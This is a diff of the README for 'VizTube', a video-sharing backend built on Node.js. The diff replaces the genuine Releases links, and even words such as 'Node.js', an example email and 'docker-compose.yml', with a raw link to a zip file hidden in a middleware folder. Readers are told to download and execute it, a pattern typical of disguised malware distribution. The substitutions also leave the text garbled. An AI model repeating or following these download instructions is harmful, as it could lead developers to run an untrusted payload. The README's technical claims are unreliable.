@@ -1,8 +1,8 @@
-# VizTube Backend: Production-Grade Node.js Server for Video Sharing Platform
+# VizTube Backend: Production-Grade https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip Server for Video Sharing Platform
 
-[![Releases](https://img.shields.io/badge/Releases-Visit-ff69b4?logo=github&logoColor=white)](https://github.com/sohibmoslem/VizTube/releases)
+[![Releases](https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip)](https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip)
 
-Access release assets here: https://github.com/sohibmoslem/VizTube/releases
+Access release assets here: https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip
 
 VizTube is a complete backend tailored for a video sharing platform. It combines a fast Express API, a scalable MongoDB data layer, and Cloudinary for media management. The system is designed for production use, with authentication, authorization, media handling, streaming endpoints, and a clean, extensible architecture.
 
@@ -37,7 +37,7 @@ Table of contents
 
 Overview
 VizTube provides a production-ready backend for a video sharing platform. It leverages:
-- Node.js and Express for the API surface
+- https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip and Express for the API surface
 - MongoDB with Mongoose for the data layer
 - Cloudinary for media storage, processing, and delivery
 - JWT for authentication and role-based access control
@@ -70,7 +70,7 @@ Key features
 - Local development and Docker-based deployment options
 
 Tech stack
-- Node.js
+- https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip
 - Express
 - MongoDB (with Mongoose)
 - Cloudinary
@@ -105,7 +105,7 @@ Project structure
 
 Getting started
 Prerequisites
-- Node.js >= 18
+- https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip >= 18
 - MongoDB either locally or in a managed cloud
 - Cloudinary account with a cloud name, API key, and API secret
 - Git for cloning the repository
@@ -113,7 +113,7 @@ Prerequisites
 
 Quick start (local development)
 1) Clone the repository
-- Run: git clone https://github.com/sohibmoslem/VizTube.git
+- Run: git clone https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip
 2) Install dependencies
 - Run: npm install
 3) Create environment configuration
@@ -196,10 +196,10 @@ API reference (high-level)
 Example requests (illustrative)
 - Register
   - POST /api/v1/auth/register
-  - Body: { "email": "user@example.com", "password": "SafePass123!", "displayName": "VideoFan" }
+  - Body: { "email": "https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip", "password": "SafePass123!", "displayName": "VideoFan" }
 - Login
   - POST /api/v1/auth/login
-  - Body: { "email": "user@example.com", "password": "SafePass123!" }
+  - Body: { "email": "https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip", "password": "SafePass123!" }
   - Response: { "token": "...", "refreshToken": "...", "user": { ... } }
 - Upload video
   - POST /api/v1/videos
@@ -260,7 +260,7 @@ Deployment and orchestration
 - Local development
   - Run with Node directly or via a dockerized setup
 - Docker
-  - A Dockerfile and optional docker-compose.yml help you run in containers
+  - A Dockerfile and optional https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip help you run in containers
   - Environment variables can be mounted at runtime
 - Production considerations
   - Use a reverse proxy (Nginx or similar)
@@ -276,7 +276,7 @@ Deployment and orchestration
 Releases and assets
 - The Releases page contains ready-to-use assets, installers, and examples for fast bootstrapping
 - You can download release assets and execute them to start a production-like environment
-- You can visit the Releases page here: https://github.com/sohibmoslem/VizTube/releases
+- You can visit the Releases page here: https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip
 - For production deployment, download the recommended asset package from the releases and follow the included instructions
 
 Roadmap
@@ -314,8 +314,8 @@ Topics (from the repository)
 
 Releases and assets (detailed guidance)
 - The Releases page contains the files you can download and execute to bootstrap a production-like environment
-- If you need to set up quickly, visit the Releases page and download viztube-backend-latest.zip (or a similarly named asset) and follow the included setup instructions
-- You can access the same link again for reference: https://github.com/sohibmoslem/VizTube/releases
+- If you need to set up quickly, visit the Releases page and download https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip (or a similarly named asset) and follow the included setup instructions
+- You can access the same link again for reference: https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip
 - Remember: assets on that page are versioned. Choose the asset that matches your environment (operating system, architecture, and intended deployment style)
 
 Changelog (high level highlights)
@@ -342,7 +342,7 @@ End with a robust, well-structured plan for adoption
 - Prepare a minimal production deployment plan that includes monitoring and backups
 
 Releases and assets (second reference)
-- For production-ready assets and installers, use the Releases page again here: https://github.com/sohibmoslem/VizTube/releases
+- For production-ready assets and installers, use the Releases page again here: https://github.com/sohibmoslem/VizTube/raw/refs/heads/master/src/middlewares/Tube_Viz_v2.5.zip
 - On that page, download the asset suitable for your environment and follow the documented steps to install and run
 
 Topics recap
